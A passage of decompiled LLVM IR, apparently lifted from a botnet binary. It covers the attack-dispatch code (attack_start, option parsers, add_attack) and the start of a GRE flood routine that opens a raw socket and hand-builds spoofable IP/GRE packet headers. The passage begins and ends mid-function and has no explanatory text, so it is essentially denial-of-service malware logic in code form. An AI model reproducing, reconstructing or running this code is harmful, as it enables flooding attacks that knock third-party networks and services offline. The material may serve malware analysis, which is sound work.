  %i_-52.17 = phi i32 [ %v1_d5e0, %dec_label_pc_d624.lr.ph ], [ %v2_d70c, %dec_label_pc_d6a8 ]
  %stack_var_-56.16 = phi i32 [ %v1_d5ec, %dec_label_pc_d624.lr.ph ], [ %v2_d71c, %dec_label_pc_d6a8 ]
  %v2_d628 = icmp eq i32 %stack_var_-56.16, 0
  br i1 %v2_d628, label %dec_label_pc_d77c, label %dec_label_pc_d630

dec_label_pc_d630:                                ; preds = %dec_label_pc_d624
  %v3_d634 = mul i32 %storemerge38, 8
  %v2_d640 = add i32 %v3_d634, %v2_d60c
  %v1_d648 = inttoptr i32 %i_-52.17 to i8*
  %v2_d648 = load i8, i8* %v1_d648, align 1
  %v3_d64c = add i32 %v2_d640, 4
  %v4_d64c = inttoptr i32 %v3_d64c to i8*
  store i8 %v2_d648, i8* %v4_d64c, align 1
  %v2_d66c = icmp eq i32 %stack_var_-56.16, 1
  br i1 %v2_d66c, label %dec_label_pc_d77c, label %dec_label_pc_d674

dec_label_pc_d674:                                ; preds = %dec_label_pc_d630
  %v1_d654 = add i32 %i_-52.17, 1
  %v1_d678 = inttoptr i32 %v1_d654 to i8*
  %v2_d678 = load i8, i8* %v1_d678, align 1
  %v1_d684 = add i32 %i_-52.17, 2
  %v1_d690 = add i32 %stack_var_-56.16, -2
  %v4_d698 = zext i8 %v2_d678 to i32
  %v2_d6a0 = sub i32 %v4_d698, %v1_d690
  %v6_d6a0 = and i32 %v2_d6a0, %v1_d690
  %v7_d6a0 = icmp slt i32 %v6_d6a0, 0
  %v8_d6a0 = icmp slt i32 %v2_d6a0, 0
  %v9_d6a0 = icmp eq i32 %v4_d698, %v1_d690
  %v3_d6a4 = xor i1 %v8_d6a0, %v7_d6a0
  %v4_d6a4 = or i1 %v9_d6a0, %v3_d6a4
  br i1 %v4_d6a4, label %dec_label_pc_d6a8, label %dec_label_pc_d77c

dec_label_pc_d6a8:                                ; preds = %dec_label_pc_d674
  store i32 %v2_d640, i32* @r4, align 4
  %v1_d6c0 = add nuw nsw i32 %v4_d698, 1
  store i32 %v1_d6c0, i32* %r0.global-to-local, align 4
  %v2_d6cc = call i32 @calloc(i32 %v1_d6c0, i32 1)
  store i32 %v2_d6cc, i32* %r0.global-to-local, align 4
  %v1_d6d4 = load i32, i32* @r4, align 4
  %v2_d6d4 = inttoptr i32 %v1_d6d4 to i32*
  store i32 %v2_d6cc, i32* %v2_d6d4, align 4
  %v1_d6ec = inttoptr i32 %v2_d640 to i32*
  %v2_d6ec = load i32, i32* %v1_d6ec, align 4
  %v1_d6f4 = inttoptr i32 %v2_d6ec to i8*
  store i32 %v2_d6ec, i32* %r0.global-to-local, align 4
  %v4_d6f8 = inttoptr i32 %v1_d684 to i8*
  call void @util_memcpy(i8* %v1_d6f4, i8* %v4_d6f8, i32 %v4_d698)
  store i32 ptrtoint (i32* @0 to i32), i32* %r0.global-to-local, align 4
  %v2_d70c = add i32 %v4_d698, %v1_d684
  %v2_d71c = sub i32 %v1_d690, %v4_d698
  %v1_d728 = add nuw nsw i32 %storemerge38, 1
  %v8_d73c = icmp sgt i32 %v4_d5f4, %v1_d728
  br i1 %v8_d73c, label %dec_label_pc_d624, label %dec_label_pc_d740

dec_label_pc_d740:                                ; preds = %dec_label_pc_d6a8, %dec_label_pc_d5d0
  %opts_-32.0 = phi i32 [ 0, %dec_label_pc_d5d0 ], [ %v2_d60c, %dec_label_pc_d6a8 ]
  %v0_d740 = call i32 @__GI___errno_location()
  %v2_d74c = inttoptr i32 %v0_d740 to i32*
  store i32 0, i32* %v2_d74c, align 4
  store i32 %v1_d400, i32* %r0.global-to-local, align 4
  call void @attack_start(i32 %v1_d400, i8 %v2_d434, i8 %v2_d464, i32 %v2_d4b8, i8 %v2_d5d4, i32 %opts_-32.0)
  store i32 ptrtoint (i32* @0 to i32), i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d77c

dec_label_pc_d77c:                                ; preds = %dec_label_pc_d490, %dec_label_pc_d674, %dec_label_pc_d630, %dec_label_pc_d624, %dec_label_pc_d5c4, %dec_label_pc_d460, %dec_label_pc_d430, %dec_label_pc_d3f4, %entry, %dec_label_pc_d740
  %opts_-36.0 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_d3f4 ], [ 0, %dec_label_pc_d430 ], [ 0, %dec_label_pc_d460 ], [ %v2_d4b8, %dec_label_pc_d5c4 ], [ %v2_d4b8, %dec_label_pc_d740 ], [ 0, %dec_label_pc_d490 ], [ %v2_d4b8, %dec_label_pc_d624 ], [ %v2_d4b8, %dec_label_pc_d630 ], [ %v2_d4b8, %dec_label_pc_d674 ]
  %opts_-32.1 = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_d3f4 ], [ 0, %dec_label_pc_d430 ], [ 0, %dec_label_pc_d460 ], [ 0, %dec_label_pc_d5c4 ], [ %opts_-32.0, %dec_label_pc_d740 ], [ 0, %dec_label_pc_d490 ], [ %v2_d60c, %dec_label_pc_d624 ], [ %v2_d60c, %dec_label_pc_d630 ], [ %v2_d60c, %dec_label_pc_d674 ]
  %opts_len_-37.0 = phi i8 [ %tmp17, %entry ], [ %tmp17, %dec_label_pc_d3f4 ], [ %tmp17, %dec_label_pc_d430 ], [ %tmp17, %dec_label_pc_d460 ], [ %tmp17, %dec_label_pc_d5c4 ], [ %v2_d5d4, %dec_label_pc_d740 ], [ %tmp17, %dec_label_pc_d490 ], [ %v2_d5d4, %dec_label_pc_d624 ], [ %v2_d5d4, %dec_label_pc_d630 ], [ %v2_d5d4, %dec_label_pc_d674 ]
  %v2_d780 = icmp eq i32 %opts_-36.0, 0
  br i1 %v2_d780, label %dec_label_pc_d790, label %dec_label_pc_d788

dec_label_pc_d788:                                ; preds = %dec_label_pc_d77c
  store i32 %opts_-36.0, i32* @r0, align 4
  %v0_d78c = call i32 @free()
  store i32 %v0_d78c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d790

dec_label_pc_d790:                                ; preds = %dec_label_pc_d77c, %dec_label_pc_d788
  %v2_d794 = icmp eq i32 %opts_-32.1, 0
  br i1 %v2_d794, label %dec_label_pc_d7ac, label %dec_label_pc_d79c

dec_label_pc_d79c:                                ; preds = %dec_label_pc_d790
  %v4_d79c = zext i8 %opts_len_-37.0 to i32
  store i32 %opts_-32.1, i32* %r0.global-to-local, align 4
  call void @free_opts(i32 %opts_-32.1, i32 %v4_d79c)
  store i32 ptrtoint (i32* @0 to i32), i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d7ac

dec_label_pc_d7ac:                                ; preds = %dec_label_pc_d790, %dec_label_pc_d79c
  store i32 %v3_d3c4, i32* @r4, align 4
  store i32 %v6_d3c4, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder i32 %opts_-32.1, { 1, 0, 2 }
  uselistorder i32 %v2_d6a0, { 1, 0 }
  uselistorder i32 %v4_d698, { 1, 0, 2, 3, 5, 4 }
  uselistorder i32 %v1_d690, { 1, 3, 0, 2 }
  uselistorder i32 %stack_var_-56.16, { 2, 0, 1 }
  uselistorder i32 %i_-52.17, { 2, 1, 0 }
  uselistorder i32 %storemerge38, { 1, 0 }
  uselistorder i32 %v4_d5f4, { 0, 2, 1 }
  uselistorder i8 %v2_d5d4, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %i_-52.012, { 2, 1, 0 }
  uselistorder i32 %storemerge213, { 1, 0 }
  uselistorder i32 %v2_d4b8, { 0, 1, 2, 4, 6, 5, 3, 7 }
  uselistorder i32 %v2_d4a0, { 0, 2, 1 }
  uselistorder i32 %v4_d484, { 0, 2, 1, 3 }
  uselistorder i32 %v1_d47c, { 1, 0 }
  uselistorder i8 %v2_d464, { 0, 2, 1 }
  uselistorder i32 %v1_d400, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 6, 5, 8, 7, 10, 9, 12, 11, 14, 13, 16, 15, 0, 1 }
  uselistorder i32 %len, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_d7ac, { 1, 0 }
  uselistorder label %dec_label_pc_d790, { 1, 0 }
  uselistorder label %dec_label_pc_d77c, { 9, 1, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_d624, { 1, 0 }
  uselistorder label %dec_label_pc_d4d0, { 1, 0 }
}

define void @attack_start(i32 %duration, i8 %vector, i8 %targs_len, i32 %targs, i8 %opts_len, i32 %opts) local_unnamed_addr {
entry:
  %v0_d7e0 = call i32 @__libc_fork()
  %v7_d7f0 = icmp eq i32 %v0_d7e0, -1
  br i1 %v7_d7f0, label %dec_label_pc_d900, label %dec_label_pc_d7f8

dec_label_pc_d7f8:                                ; preds = %entry
  %tmp22 = icmp slt i32 %v0_d7e0, 1
  br i1 %tmp22, label %dec_label_pc_d808, label %dec_label_pc_d900

dec_label_pc_d808:                                ; preds = %dec_label_pc_d7f8
  %v0_d808 = call i32 @__libc_fork()
  %v3_d818 = icmp eq i32 %v0_d808, -1
  br i1 %v3_d818, label %dec_label_pc_d820, label %dec_label_pc_d828

dec_label_pc_d820:                                ; preds = %dec_label_pc_d808
  %v1_d824 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_d828

dec_label_pc_d828:                                ; preds = %dec_label_pc_d808, %dec_label_pc_d820
  %v2_d82c = icmp eq i32 %v0_d808, 0
  br i1 %v2_d82c, label %dec_label_pc_d834, label %dec_label_pc_d8e0.preheader

dec_label_pc_d834:                                ; preds = %dec_label_pc_d828
  %v1_d83c = call i32 @sleep(i32 %duration)
  store i32 %v1_d83c, i32* @r0, align 4
  %v0_d840 = call i32 @getppid()
  %v2_d850 = call i32 @kill(i32 %v0_d840, i32 9)
  %v1_d858 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_d8e0.preheader

dec_label_pc_d8e0.preheader:                      ; preds = %dec_label_pc_d828, %dec_label_pc_d834
  %v2_d8e4.pre = load i8, i8* @methods_len, align 1
  %v7_d8f4 = sext i8 %v2_d8e4.pre to i32
  br label %dec_label_pc_d8e0

dec_label_pc_d868:                                ; preds = %dec_label_pc_d8e0
  %v3_d86c = mul i32 %storemerge3, 4
  %v2_d878 = load i32, i32* @methods, align 4
  %v2_d87c = add i32 %v2_d878, %v3_d86c
  %v1_d880 = inttoptr i32 %v2_d87c to i32*
  %v2_d880 = load i32, i32* %v1_d880, align 4
  %v1_d884 = add i32 %v2_d880, 4
  %v2_d884 = inttoptr i32 %v1_d884 to i8*
  %v3_d884 = load i8, i8* %v2_d884, align 1
  %v9_d88c = icmp eq i8 %v3_d884, %vector
  %v1_d8d8 = add i32 %storemerge3, 1
  br i1 %v9_d88c, label %dec_label_pc_d894, label %dec_label_pc_d8e0

dec_label_pc_d894:                                ; preds = %dec_label_pc_d868
  %v2_d8ac = load i32, i32* %v1_d880, align 4
  %v1_d8b0 = inttoptr i32 %v2_d8ac to i32*
  %v2_d8b0 = load i32, i32* %v1_d8b0, align 4
  call void @__pseudo_branch(i32 %v2_d8b0)
  br label %dec_label_pc_d8f8

dec_label_pc_d8e0:                                ; preds = %dec_label_pc_d868, %dec_label_pc_d8e0.preheader
  %storemerge3 = phi i32 [ %v1_d8d8, %dec_label_pc_d868 ], [ 0, %dec_label_pc_d8e0.preheader ]
  %sext = mul i32 %storemerge3, 16777216
  %v9_d8f4 = sdiv i32 %sext, 16777216
  %v10_d8f4 = icmp sgt i32 %v7_d8f4, %v9_d8f4
  br i1 %v10_d8f4, label %dec_label_pc_d868, label %dec_label_pc_d8f8

dec_label_pc_d8f8:                                ; preds = %dec_label_pc_d8e0, %dec_label_pc_d894
  %v1_d8fc = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_d900

dec_label_pc_d900:                                ; preds = %dec_label_pc_d7f8, %entry, %dec_label_pc_d8f8
  ret void

; uselistorder directives
  uselistorder i32 %v0_d7e0, { 1, 0 }
  uselistorder label %dec_label_pc_d900, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d8e0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_d828, { 1, 0 }
}

define i8* @attack_get_opt_str(i8 %opts_len, i32 %opts, i8 %opt, i8* %def) local_unnamed_addr {
entry:
  %tmp9 = sext i8 %opts_len to i32
  %v10_d9a423 = icmp sgt i8 %opts_len, 0
  br i1 %v10_d9a423, label %dec_label_pc_d948, label %dec_label_pc_d9a8

dec_label_pc_d948:                                ; preds = %entry, %dec_label_pc_d998
  %storemerge524 = phi i32 [ %v1_d990, %dec_label_pc_d998 ], [ 0, %entry ]
  %v3_d94c = mul i32 %storemerge524, 8
  %v2_d958 = add i32 %v3_d94c, %opts
  %v1_d95c = add i32 %v2_d958, 4
  %v2_d95c = inttoptr i32 %v1_d95c to i8*
  %v3_d95c = load i8, i8* %v2_d95c, align 1
  %v9_d964 = icmp eq i8 %v3_d95c, %opt
  %v1_d990 = add i32 %storemerge524, 1
  br i1 %v9_d964, label %dec_label_pc_d96c, label %dec_label_pc_d998

dec_label_pc_d96c:                                ; preds = %dec_label_pc_d948
  %v1_d980 = inttoptr i32 %v2_d958 to i32*
  %v2_d980 = load i32, i32* %v1_d980, align 4
  %v5_d984 = inttoptr i32 %v2_d980 to i8*
  br label %dec_label_pc_d9b0

dec_label_pc_d998:                                ; preds = %dec_label_pc_d948
  %sext = mul i32 %v1_d990, 16777216
  %v9_d9a4 = sdiv i32 %sext, 16777216
  %v10_d9a4 = icmp sgt i32 %tmp9, %v9_d9a4
  br i1 %v10_d9a4, label %dec_label_pc_d948, label %dec_label_pc_d9a8

dec_label_pc_d9a8:                                ; preds = %dec_label_pc_d998, %entry
  br label %dec_label_pc_d9b0

dec_label_pc_d9b0:                                ; preds = %dec_label_pc_d96c, %dec_label_pc_d9a8
  %storemerge = phi i8* [ %v5_d984, %dec_label_pc_d96c ], [ %def, %dec_label_pc_d9a8 ]
  ret i8* %storemerge

; uselistorder directives
  uselistorder i32 %storemerge524, { 1, 0 }
  uselistorder label %dec_label_pc_d9b0, { 1, 0 }
  uselistorder label %dec_label_pc_d948, { 1, 0 }
}

define i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 %opt, i32 %def) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_d9c8 = load i32, i32* @fp, align 4
  store i32 55760, i32* %stack_var_-4, align 4
  %v2_d9cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d9cc, i32* @fp, align 4
  %v14_da00 = call i8* @attack_get_opt_str(i8 %opts_len, i32 %opts, i8 %opt, i8* null)
  %v2_da10 = icmp eq i8* %v14_da00, null
  br i1 %v2_da10, label %dec_label_pc_da38, label %dec_label_pc_da24

dec_label_pc_da24:                                ; preds = %entry
  %v4_da2c = call i32 @util_atoi(i8* nonnull %v14_da00, i32 10)
  br label %dec_label_pc_da38

dec_label_pc_da38:                                ; preds = %entry, %dec_label_pc_da24
  %storemerge = phi i32 [ %v4_da2c, %dec_label_pc_da24 ], [ %def, %entry ]
  store i32 %v3_d9c8, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_da38, { 1, 0 }
}

define i32 @attack_get_opt_ip(i8 %opts_len, i32 %opts, i8 %opt, i32 %def) local_unnamed_addr {
entry:
  %v3_da50 = load i32, i32* @fp, align 4
  %v14_da88 = call i8* @attack_get_opt_str(i8 %opts_len, i32 %opts, i8 %opt, i8* null)
  %v16_da88 = ptrtoint i8* %v14_da88 to i32
  %v2_da98 = icmp eq i8* %v14_da88, null
  br i1 %v2_da98, label %dec_label_pc_dabc, label %dec_label_pc_daac

dec_label_pc_daac:                                ; preds = %entry
  store i32 %v16_da88, i32* @r0, align 4
  %v1_dab0 = call i32 @inet_addr(i32 %v16_da88)
  br label %dec_label_pc_dabc

dec_label_pc_dabc:                                ; preds = %entry, %dec_label_pc_daac
  %storemerge = phi i32 [ %v1_dab0, %dec_label_pc_daac ], [ %def, %entry ]
  store i32 %v3_da50, i32* @fp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v16_da88, { 1, 0 }
  uselistorder label %dec_label_pc_dabc, { 1, 0 }
}

define void @add_attack(i8 %vector, i32 %func) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %func, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_dad4 = load i32, i32* @fp, align 4
  store i32 56028, i32* %stack_var_-4, align 4
  %v2_dad8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dad8, i32* @fp, align 4
  store i32 %func, i32* %stack_var_-32, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_daf4 = call i32 @calloc(i32 1, i32 8)
  %v3_db08 = add i32 %v2_daf4, 4
  %v4_db08 = inttoptr i32 %v3_db08 to i8*
  store i8 %vector, i8* %v4_db08, align 1
  %v3_db10 = load i32, i32* %stack_var_-32, align 4
  %v2_db14 = inttoptr i32 %v2_daf4 to i32*
  store i32 %v3_db10, i32* %v2_db14, align 4
  %v2_db1c = load i32, i32* @methods, align 4
  %v2_db24 = load i8, i8* @methods_len, align 1
  %v3_db24 = zext i8 %v2_db24 to i32
  %v1_db28 = mul nuw nsw i32 %v3_db24, 4
  %v3_db2c = add nuw nsw i32 %v1_db28, 4
  store i32 %v3_db2c, i32* %r1.global-to-local, align 4
  %v2_db38 = inttoptr i32 %v2_db1c to i32*
  %v3_db38 = call i32 @realloc(i32* %v2_db38, i32 %v3_db2c)
  store i32 %v3_db38, i32* @methods, align 4
  %v2_db50 = load i8, i8* @methods_len, align 1
  %v3_db50 = zext i8 %v2_db50 to i32
  store i32 %v3_db50, i32* %r1.global-to-local, align 4
  %v3_db58 = mul nuw nsw i32 %v3_db50, 4
  %v2_db68 = add i32 %v3_db58, %v3_db38
  %v2_db70 = inttoptr i32 %v2_db68 to i32*
  store i32 %v2_daf4, i32* %v2_db70, align 4
  %v0_db74 = load i32, i32* %r1.global-to-local, align 4
  %v1_db74 = add i32 %v0_db74, 1
  %v1_db80 = trunc i32 %v1_db74 to i8
  store i8 %v1_db80, i8* @methods_len, align 1
  store i32 %v3_dad4, i32* @fp, align 4
  ret void

; uselistorder directives
  uselistorder i32 %v3_db2c, { 1, 0 }
  uselistorder i32 %v2_daf4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i8* @methods_len, { 1, 2, 3, 0 }
}

define void @free_opts(i32 %opts, i32 %len) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %opts, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_dba8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %len, i32* %stack_var_-32, align 4
  %v2_dbb4 = icmp eq i32 %v0_dba8, 0
  br i1 %v2_dbb4, label %dec_label_pc_dc2c, label %dec_label_pc_dc14.preheader

dec_label_pc_dc14.preheader:                      ; preds = %entry
  %v5_dc2018 = icmp sgt i32 %len, 0
  br i1 %v5_dc2018, label %dec_label_pc_dbc8, label %dec_label_pc_dc24

dec_label_pc_dbc8:                                ; preds = %dec_label_pc_dc14.preheader, %dec_label_pc_dc08
  %storemerge120 = phi i32 [ %v1_dc0c, %dec_label_pc_dc08 ], [ 0, %dec_label_pc_dc14.preheader ]
  %v3_dc1819 = phi i32 [ %v3_dc18.pre, %dec_label_pc_dc08 ], [ %len, %dec_label_pc_dc14.preheader ]
  %v3_dbcc = mul i32 %storemerge120, 8
  %v2_dbd8 = add i32 %v3_dbcc, %v0_dba8
  %v1_dbdc = inttoptr i32 %v2_dbd8 to i32*
  %v2_dbdc = load i32, i32* %v1_dbdc, align 4
  %v2_dbe0 = icmp eq i32 %v2_dbdc, 0
  br i1 %v2_dbe0, label %dec_label_pc_dc08, label %dec_label_pc_dbe8

dec_label_pc_dbe8:                                ; preds = %dec_label_pc_dbc8
  %v2_dbfc = load i32, i32* %v1_dbdc, align 4
  store i32 %v2_dbfc, i32* @r0, align 4
  %v0_dc04 = call i32 @free()
  store i32 %v0_dc04, i32* %r0.global-to-local, align 4
  %v3_dc18.pre.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_dc08

dec_label_pc_dc08:                                ; preds = %dec_label_pc_dbc8, %dec_label_pc_dbe8
  %v3_dc18.pre = phi i32 [ %v3_dc1819, %dec_label_pc_dbc8 ], [ %v3_dc18.pre.pre, %dec_label_pc_dbe8 ]
  %v1_dc0c = add i32 %storemerge120, 1
  %v5_dc20 = icmp slt i32 %v1_dc0c, %v3_dc18.pre
  br i1 %v5_dc20, label %dec_label_pc_dbc8, label %dec_label_pc_dc24

dec_label_pc_dc24:                                ; preds = %dec_label_pc_dc08, %dec_label_pc_dc14.preheader
  store i32 %v0_dba8, i32* @r0, align 4
  %v0_dc28 = call i32 @free()
  store i32 %v0_dc28, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_dc2c

dec_label_pc_dc2c:                                ; preds = %entry, %dec_label_pc_dc24
  ret void

; uselistorder directives
  uselistorder i32 %v1_dc0c, { 1, 0 }
  uselistorder i32 %v3_dc18.pre, { 1, 0 }
  uselistorder i32 %storemerge120, { 1, 0 }
  uselistorder i32 %v0_dba8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_dc2c, { 1, 0 }
  uselistorder label %dec_label_pc_dc08, { 1, 0 }
  uselistorder label %dec_label_pc_dbc8, { 1, 0 }
}

define void @attack_gre_ip(i8 %targs_len, i32 %targs, i8 %opts_len, i32 %opts) local_unnamed_addr {
entry:
  %tmp32 = sext i8 %targs_len to i32
  %fd_-100 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 56388, i32* %stack_var_-4, align 4
  %v2_dc40 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dc40, i32* @fp, align 4
  %v3_dc6c = call i32 @calloc(i32 %tmp32, i32 4)
  %v9_dc8c = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 2, i32 0)
  %v1_dc94 = trunc i32 %v9_dc8c to i8
  %v9_dcb0 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 3, i32 65535)
  %sext3 = mul i32 %v9_dcb0, 65536
  %v1_dcb4 = sdiv i32 %sext3, 65536
  %v1_dcb8 = trunc i32 %v1_dcb4 to i16
  %v9_dcd0 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 4, i32 64)
  %v1_dcd8 = trunc i32 %v9_dcd0 to i8
  %v9_dcf0 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 5, i32 1)
  %sext5 = mul i32 %v9_dcf0, 16777216
  %v1_dcf4 = sdiv i32 %sext5, 16777216
  %v1_dcf8 = trunc i32 %v1_dcf4 to i8
  %v9_dd14 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 6, i32 65535)
  %v9_dd38 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 7, i32 65535)
  %sext6 = mul i32 %v9_dd38, 65536
  %v1_dd3c = sdiv i32 %sext6, 65536
  %v1_dd40 = trunc i32 %v1_dd3c to i16
  %v9_dd58 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 0, i32 512)
  %v9_dd78 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 1, i32 1)
  %sext7 = mul i32 %v9_dd78, 16777216
  %v1_dd7c = sdiv i32 %sext7, 16777216
  %v1_dd80 = trunc i32 %v1_dd7c to i8
  %v9_dd98 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 19, i32 0)
  %sext8 = mul i32 %v9_dd98, 16777216
  %v1_dd9c = sdiv i32 %sext8, 16777216
  %v1_dda0 = trunc i32 %v1_dd9c to i8
  %v2_dda8 = load i32, i32* @LOCAL_ADDR, align 4
  %v9_ddc4 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 25, i32 %v2_dda8)
  %v3_dddc = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_ddec = icmp eq i32 %v3_dddc, -1
  br i1 %v7_ddec, label %dec_label_pc_e4f4, label %dec_label_pc_ddf4

dec_label_pc_ddf4:                                ; preds = %entry
  store i32 1, i32* %fd_-100, align 4
  %v2_ddfc = ptrtoint i32* %fd_-100 to i32
  store i32 0, i32* @r1, align 4
  %v5_de18 = call i32 @__GI_setsockopt(i32 %v3_dddc, i32 0, i32 3, i32 %v2_ddfc, i32 4)
  %v3_de20 = icmp eq i32 %v5_de18, -1
  br i1 %v3_de20, label %dec_label_pc_de28, label %dec_label_pc_e178.preheader

dec_label_pc_e178.preheader:                      ; preds = %dec_label_pc_ddf4
  %fold = add i32 %v9_dd58, 52
  %v3_df14 = urem i32 %fold, 65536
  %v4_df30 = urem i32 %v1_dcb4, 65536
  %v2_df5c = icmp eq i8 %v1_dcf8, 0
  %fold15 = add i32 %v9_dd58, 28
  %v3_e03c = urem i32 %fold15, 65536
  %v3_e064 = xor i32 %v4_df30, 65535
  %v2_e0d0 = icmp eq i8 %v1_dda0, 0
  %v4_e120 = urem i32 %v1_dd3c, 65536
  %fold21 = add i32 %v9_dd58, 8
  %v3_e150 = urem i32 %fold21, 65536
  br label %dec_label_pc_e178

dec_label_pc_de28:                                ; preds = %dec_label_pc_ddf4
  %v1_de2c = call i32 @__GI___libc_close(i32 %v3_dddc)
  br label %dec_label_pc_e4f4

dec_label_pc_de40:                                ; preds = %dec_label_pc_e178
  %v3_de44 = mul i32 %v3_de40, 4
  %v2_de50 = add i32 %v3_de44, %v3_dc6c
  store i32 %v2_de50, i32* @r4, align 4
  %v2_de60 = call i32 @calloc(i32 1510, i32 4)
  %v1_de68 = load i32, i32* @r4, align 4
  %v2_de68 = inttoptr i32 %v1_de68 to i32*
  store i32 %v2_de60, i32* %v2_de68, align 4
  %v3_de6c = load i32, i32* %fd_-100, align 4
  %v3_de70 = mul i32 %v3_de6c, 4
  %v2_de7c = add i32 %v3_de70, %v3_dc6c
  %v1_de80 = inttoptr i32 %v2_de7c to i32*
  %v2_de80 = load i32, i32* %v1_de80, align 4
  %v5_de84 = inttoptr i32 %v2_de80 to i8*
  %v1_de98 = add i32 %v2_de80, 24
  %v5_de9c = inttoptr i32 %v1_de98 to i8*
  %v1_dea4 = add i32 %v2_de80, 44
  store i8 69, i8* %v5_de84, align 1
  %v3_defc = add i32 %v2_de80, 1
  %v4_defc = inttoptr i32 %v3_defc to i8*
  store i8 %v1_dc94, i8* %v4_defc, align 1
  %v1_df1c = call i32 @__GI_htons(i32 %v3_df14)
  %sext11 = mul i32 %v1_df1c, 65536
  %v1_df20 = sdiv i32 %sext11, 65536
  %v1_df2c = trunc i32 %v1_df20 to i16
  %v3_df2c = add i32 %v2_de80, 2
  %v4_df2c = inttoptr i32 %v3_df2c to i16*
  store i16 %v1_df2c, i16* %v4_df2c, align 2
  %v1_df38 = call i32 @__GI_htons(i32 %v4_df30)
  %v1_df48 = trunc i32 %v1_df38 to i16
  %v3_df48 = add i32 %v2_de80, 4
  %v4_df48 = inttoptr i32 %v3_df48 to i16*
  store i16 %v1_df48, i16* %v4_df48, align 2
  %v3_df54 = add i32 %v2_de80, 8
  %v4_df54 = inttoptr i32 %v3_df54 to i8*
  store i8 %v1_dcd8, i8* %v4_df54, align 1
  br i1 %v2_df5c, label %dec_label_pc_df7c, label %dec_label_pc_df64

dec_label_pc_df64:                                ; preds = %dec_label_pc_de40
  %v1_df68 = call i32 @__GI_htons(i32 16384)
  %sext13 = mul i32 %v1_df68, 65536
  %v1_df6c = sdiv i32 %sext13, 65536
  %v1_df78 = trunc i32 %v1_df6c to i16
  %v3_df78 = add i32 %v2_de80, 6
  %v4_df78 = inttoptr i32 %v3_df78 to i16*
  store i16 %v1_df78, i16* %v4_df78, align 2
  br label %dec_label_pc_df7c

dec_label_pc_df7c:                                ; preds = %dec_label_pc_de40, %dec_label_pc_df64
  %v3_df84 = add i32 %v2_de80, 9
  %v4_df84 = inttoptr i32 %v3_df84 to i8*
  store i8 47, i8* %v4_df84, align 1
  %v2_df90 = add i32 %v2_de80, 12
  %v3_df90 = inttoptr i32 %v2_df90 to i32*
  store i32 %v9_ddc4, i32* %v3_df90, align 4
  %v3_df94 = load i32, i32* %fd_-100, align 4
  %v2_dfa0 = mul i32 %v3_df94, 24
  %v2_dfac = add i32 %v2_dfa0, %targs
  %v1_dfb0 = add i32 %v2_dfac, 16
  %v2_dfb0 = inttoptr i32 %v1_dfb0 to i32*
  %v3_dfb0 = load i32, i32* %v2_dfb0, align 4
  %v2_dfb8 = add i32 %v2_de80, 16
  %v3_dfb8 = inttoptr i32 %v2_dfb8 to i32*
  store i32 %v3_dfb0, i32* %v3_dfb8, align 4
  %v1_dfc0 = call i32 @__GI_htons(i32 2048)
  %v1_dfd0 = trunc i32 %v1_dfc0 to i16
  %v3_dfd0 = add i32 %v2_de80, 22
  %v4_dfd0 = inttoptr i32 %v3_dfd0 to i16*
  store i16 %v1_dfd0, i16* %v4_dfd0, align 2
  store i8 69, i8* %v5_de9c, align 1
  %v3_e024 = add i32 %v2_de80, 25
  %v4_e024 = inttoptr i32 %v3_e024 to i8*
  store i8 %v1_dc94, i8* %v4_e024, align 1
  %v1_e044 = call i32 @__GI_htons(i32 %v3_e03c)
  %sext16 = mul i32 %v1_e044, 65536
  %v1_e048 = sdiv i32 %sext16, 65536
  %v1_e054 = trunc i32 %v1_e048 to i16
  %v3_e054 = add i32 %v2_de80, 26
